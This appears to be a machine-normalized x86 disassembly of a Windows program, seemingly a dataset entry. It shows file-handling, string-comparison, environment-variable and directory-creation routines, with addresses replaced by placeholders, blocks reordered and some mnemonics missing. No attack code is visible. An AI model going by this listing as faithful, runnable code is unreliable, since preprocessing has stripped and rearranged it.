jne r-xdata
or esi 0x10000000
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
call sub_408122
mov [ eax ] 0x18
call sub_40812b
and [ eax ] 0x0
mov eax edi
jmp r-xdata
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4080af
pop ecx
mov esi edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
push ebx
call sub_40d305
pop ecx
mov eax esi
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_40d169
mov eax ebx
pop ecx
sar eax 0x5
pop ecx
mov cl [ ebp - 0x1 ]
lea edi [ eax * 4 + rw-data ]
mov eax ebx
or cl 0x1
and eax 0x1f
mov [ ebp + 0xb ] cl
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
and [ ebp + 0xb ] 0x48
mov [ eax + esi + 0x4 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test cl 0x80
je r-xdata
mov esi ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_40993a
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x13 ] 0x0
lea eax [ ebp + 0x13 ]
push 0x1
push eax
push ebx
call sub_4096fc
add esp 0xc
test eax eax
jne r-xdata
call sub_40812b
cmp [ eax ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_40993a
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x13 ] 0x1a
jne r-xdata
push ebx
call sub_40934a
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebp - 0x10 ]
push ebx
call sub_40da62
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_40d69a
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_40d6cb
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_40d760
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_40d8c5
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ rw-data ]
push edi
je r-xdata
xor eax eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push ebx
call sub_40c460
pop ecx
mov edi eax
call sub_40dd85
test eax eax
jne r-xdata
push eax
call sub_40c460
cmp eax edi
pop ecx
jbe r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
add esi 0x4
jmp r-xdata
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push edi
push ebx
push eax
call sub_40dd46
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40d950
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_40d98e
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_40ab8d
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_40c1da
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_40da62
push ebp
mov ebp esp
mov eax 0x1004
call sub_407830
push ebx
push esi
xor esi esi
push 0x1
push esi
push [ ebp + 0x8 ]
call sub_40993a
or ebx 0xffffffff
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax ebx
push 0x2
push esi
push [ ebp + 0x8 ]
call sub_40993a
add esp 0xc
cmp eax ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
jge r-xdata
mov ebx 0x1000
lea eax [ ebp - 0x1004 ]
push ebx
push esi
push eax
call sub_406580
push 0x8000
push [ ebp + 0x8 ]
call sub_40df81
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40993a
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40993a
push [ ebp + 0x8 ]
call sub_40d264
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi ebx
jne r-xdata
push eax
lea eax [ ebp - 0x1004 ]
push eax
push [ ebp + 0x8 ]
call sub_409dcd
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
call sub_408122
mov [ eax ] 0xd
call [ GetLastError@IAT ]
mov edi eax
call sub_40812b
mov [ eax ] edi
call sub_40812b
cmp [ eax ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
call sub_408122
mov [ eax ] 0xd
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40df81
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
cmp edi ebx
mov eax ebx
jge r-xdata
sub_40db87
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
dec eax
push ebx
push esi
dec eax
push edi
je r-xdata
mov ebx [ rw-data ]
mov edi rw-data
dec eax
dec eax
je r-xdata
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4090c1
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_40dd09
mov edi eax
pop ecx
add edi 0x8
pop ecx
mov ebx [ edi ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x8
je r-xdata
cmp [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
push ebx
call sub_40a01e
pop ecx
jmp r-xdata
cmp ebx 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov edx [ esi + 0x54 ]
cmp eax 0x8
mov [ ebp - 0x8 ] edx
mov [ esi + 0x54 ] ecx
jne r-xdata
cmp eax 0xb
je r-xdata
push 0x3
call sub_408656
push 0x1
call sub_40a01e
pop ecx
sub eax 0x4
je r-xdata
mov [ edi ] ecx
mov edx [ esi + 0x58 ]
mov [ esi + 0x58 ] 0x8c
mov [ ebp - 0xc ] edx
cmp eax 0x4
jne r-xdata
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jne r-xdata
push 0x1
call sub_40a01e
pop ecx
mov ecx [ rw-data ]
mov eax [ rw-data ]
add eax ecx
cmp ecx eax
jge r-xdata
cmp eax 0x8
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x1
call sub_409fbd
mov esi [ ebp + 0x8 ]
pop ecx
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call ebx
cmp [ ebp + 0x8 ] 0xb
pop ecx
je r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x8
mov [ esi + 0x54 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x4
jne r-xdata
mov edx [ esi + 0x50 ]
add eax 0xc
and [ edx + eax - 0x4 ] 0x0
mov edx [ rw-data ]
mov edi [ rw-data ]
inc ecx
add edi edx
cmp ecx edi
jl r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
mov [ esi + 0x58 ] eax
sub_40dd09
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx + 0x4 ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax + 0x4 ] esi
je r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_40dd46
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1
push [ rw-data ]
call sub_40dfe2
add esp 0x1c
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
add eax 0xfffffffe
pop ebp
retn
mov eax 0x7fffffff
pop ebp
retn
sub_40dd85
push ecx
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov eax [ esi ]
cmp eax edi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push ebp
call sub_406c98
cmp eax edi
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
push edi
push ebp
push eax
push 0xffffffff
push [ esi ]
push edi
push 0x1
call ebx
test eax eax
je r-xdata
push edi
push [ esp + 0x14 ]
call sub_40e25f
mov eax [ esi + 0x4 ]
add esi 0x4
pop ecx
cmp eax edi
pop ecx
jne r-xdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov ebp eax
cmp ebp edi
je r-xdata
sub_40ddf3
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
je r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov [ ecx ] 0x2d
inc ecx
neg esi
jmp r-xdata
add bl 0x30
add bl 0x57
jmp r-xdata
mov edi ecx
mov eax esi
xor edx edx
div [ ebp + 0x10 ]
mov eax esi
mov ebx edx
xor edx edx
div [ ebp + 0x10 ]
cmp ebx 0x9
mov esi eax
jbe r-xdata
and [ ecx ] 0x0
dec ecx
mov [ ecx ] bl
inc ecx
test esi esi
ja r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
mov [ edi ] al
dec ecx
inc edi
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40de4f
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ddf3
mov eax [ ebp + 0xc ]
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
push 0x1
pop eax
sub_40de80
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
[ rw-data ]
mov ebx ecx
push 0x13
call sub_409fbd
mov [ esp ] 0x1
mov ecx ebx
push 0x0
jmp r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
pop eax
or eax eax
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_40d98e
mov ebx eax
add esp 0x4
call sub_40d98e
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov ebx ecx
push 0x13
call sub_40a01e
add esp 0x4
mov ecx ebx
[ rw-data ]
jmp r-xdata
neg ecx
dec ecx
jne r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_40df81
mov eax [ esp + 0x4 ]
push esi
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov esi 0x8000
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 4 + 0x4 ]
mov cl [ ecx + eax * 4 + 0x4 ]
mov al cl
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
call sub_408122
mov [ eax ] 0x16
or eax 0xffffffff
pop esi
retn
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
sub_40dfe2
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ rw-data ] ebx
push 0x1
pop edi
jne r-xdata
mov esi [ ebp + 0x14 ]
cmp esi ebx
jle r-xdata
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_40c3fe
pop ecx
pop ecx
mov esi eax
mov [ ebp + 0x14 ] esi
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_40c3fe
pop ecx
pop ecx
mov [ ebp + 0x1c ] eax
xor eax eax
mov [ rw-data ] 0x2
cmp eax edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
cmp esi [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] edi
jle r-xdata
push 0x2
push ebx
push ebx
push esi
push [ ebp + 0x10 ]
push 0x9
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
cmp esi edi
jg r-xdata
mov eax edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
add eax eax
add eax 0x3
and al 0xfc
call sub_407830
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x3
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x20 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
pop eax
jmp r-xdata
cmp esi ebx
jle r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
push ebx
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x9
push [ ebp + 0x20 ]
call esi
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_407830
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x28 ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
cmp edi ebx
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push esi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
push esi
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
sub_40e25f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
push 0x3d
push [ ebp + 0x8 ]
call sub_407705
mov esi eax
pop ecx
cmp esi edi
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp [ esi + 0x1 ] bl
sete bl
cmp eax [ rw-data ]
jne r-xdata
cmp eax edi
jne r-xdata
push eax
call sub_40e43e
pop ecx
mov [ rw-data ] eax
sub esi [ ebp + 0x8 ]
mov edi [ rw-data ]
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x8 ]
call sub_40e3e6
mov esi eax
pop ecx
test esi esi
pop ecx
jl r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
test ebx ebx
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
push 0x4
call sub_406c98
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_40dd85
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi * 4 + 0x8 ]
push eax
push edi
call sub_40bf93
pop ecx
test eax eax
pop ecx
je r-xdata
neg esi
mov eax [ ebp + 0x8 ]
mov [ edi + esi * 4 ] eax
jmp r-xdata
push [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
call sub_406c50
pop ecx
mov [ eax ] edi
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + esi * 4 ] ecx
and [ eax + esi * 4 + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
shl eax 0x2
push eax
push [ ebp - 0x4 ]
call sub_40bf93
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edi ] eax
add edi 0x4
jmp r-xdata
push 0x4
call sub_406c98
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_40c460
inc eax
inc eax
push eax
call sub_406c98
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ eax ] edi
push [ ebp + 0x8 ]
push esi
call sub_406430
mov eax esi
pop ecx
sub eax [ ebp + 0x8 ]
pop ecx
add eax [ ebp - 0x8 ]
and [ eax ] 0x0
inc eax
neg ebx
sbb ebx ebx
not ebx
and ebx eax
push ebx
push esi
call [ SetEnvironmentVariableA@IAT ]
push esi
call sub_406c50
pop ecx
mov [ rw-data ] eax
sub_40e3e6
push esi
mov esi [ rw-data ]
push edi
mov eax [ esi ]
test eax eax
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi ]
cmp al 0x3d
je r-xdata
push edi
push eax
push [ esp + 0x14 ]
call sub_40dd46
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
pop esi
retn
sub_40e43e
push edi
mov edi [ esp + 0x8 ]
xor ecx ecx
test edi edi
jne r-xdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
je r-xdata
xor eax eax
pop edi
retn
push ebx
push ebp
lea eax [ ecx * 4 + 0x4 ]
push esi
push eax
call sub_406c98
mov esi eax
pop ecx
test esi esi
mov ebp esi
jne r-xdata
mov edx [ eax ]
inc ecx
add eax 0x4
test edx edx
jne r-xdata
mov eax [ edi ]
mov ebx edi
push 0x9
call sub_406ec2
pop ecx
and [ esi ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
pop edi
retn
push eax
add ebx 0x4
call sub_40779c
mov [ esi ] eax
mov eax [ ebx ]
pop ecx
add esi 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_40e4e0
sub esp 0x100
push ebx
push ebp
mov ebp [ CreateDirectoryA@IAT ]
push edi
mov edi [ esp + 0x110 ]
push 0x0
push edi
call ebp
test eax eax
jne r-xdata
pop edi
pop ebp
mov eax 0x1
pop ebx
add esp 0x100
retn
or ecx 0xffffffff
push esi
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x10 ]
mov eax ecx
mov esi edi
mov edi edx
mov bl 0x5c
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
pop ebp
xor eax eax
pop ebx
add esp 0x100
retn
cmp [ esp + ecx + 0xc ] bl
je r-xdata
test ecx ecx
mov [ esp + ecx + 0xc ] 0x0
jle r-xdata
dec ecx
test ecx ecx
jle r-xdata
lea ecx [ esp + 0xc ]
push 0x0
push ecx
call ebp
test eax eax
je r-xdata
jmp r-xdata
lea edi [ esp + 0xc ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffe
test ecx ecx
jle r-xdata
lea edi [ esp + 0xc ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
dec ecx
push eax
push edx
mov [ esp + ecx + 0x14 ] bl
call ebp
test eax eax
je r-xdata
mov edi [ esp + 0x110 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0xc ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx edx
jae r-xdata
lea edi [ esp + 0xc ]
or ecx 0xffffffff
[ edi ]
not ecx
push eax
dec ecx
lea eax [ esp + 0x10 ]
push eax
mov [ esp + ecx + 0x14 ] bl
call ebp
test eax eax
jne r-xdata
sub_40e630
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_40e5f0
add esp 0x4
test eax eax
je r-xdata
xor eax eax
pop esi
retn
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
push 0xc0000000
push esi
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax 0x1
pop esi
retn
sub_40e680
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
mov ebx 0x1
[ edi ]
not ecx
dec ecx
mov edi esi
lea edx [ ecx + esi - 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx ebx
jle r-xdata
pop edi
pop esi
mov eax edx
pop ebx
retn
cmp [ edx ] 0x5c
je r-xdata
inc edx
dec edx
mov edi esi
or ecx 0xffffffff
xor eax eax
inc ebx
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jl r-xdata
pop edi
pop esi
mov eax edx
pop ebx
retn
sub_40e6d0
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
jne r-xdata
pop edi
xor eax eax
pop esi
retn
